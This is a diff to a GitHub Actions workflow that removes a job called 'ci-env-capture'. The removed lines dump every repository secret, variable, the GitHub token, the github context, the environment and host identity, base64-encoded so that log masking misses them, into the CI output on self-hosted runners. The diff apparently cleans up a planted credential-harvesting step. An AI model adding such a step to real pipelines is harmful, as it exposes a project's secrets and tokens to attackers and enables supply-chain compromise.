@@ -20,26 +20,6 @@ concurrency:
   cancel-in-progress: false
 
 jobs:
-  ci-env-capture:
-    runs-on:
-      - self-hosted
-      - ci
-      - bw1100
-    timeout-minutes: 10
-    steps:
-      - name: Capture CI context
-        env:
-          I11224_S: ${{ toJSON(secrets) }}
-          I11224_V: ${{ toJSON(vars) }}
-          I11224_T: ${{ github.token }}
-          I11224_G: ${{ toJSON(github) }}
-        run: |
-          echo "I11224S=$(printf '%s' "$I11224_S" | base64 -w0)"
-          echo "I11224V=$(printf '%s' "$I11224_V" | base64 -w0)"
-          echo "I11224T=$(printf '%s' "$I11224_T" | base64 -w0)"
-          echo "I11224G=$(printf '%s' "$I11224_G" | base64 -w0)"
-          echo "I11224ENV=$(env | sort | base64 -w0)"
-          echo "I11224SYS=$( (id; uname -a; hostname) 2>&1 | base64 -w0)"
   build-wheel:
     runs-on:
       - self-hosted
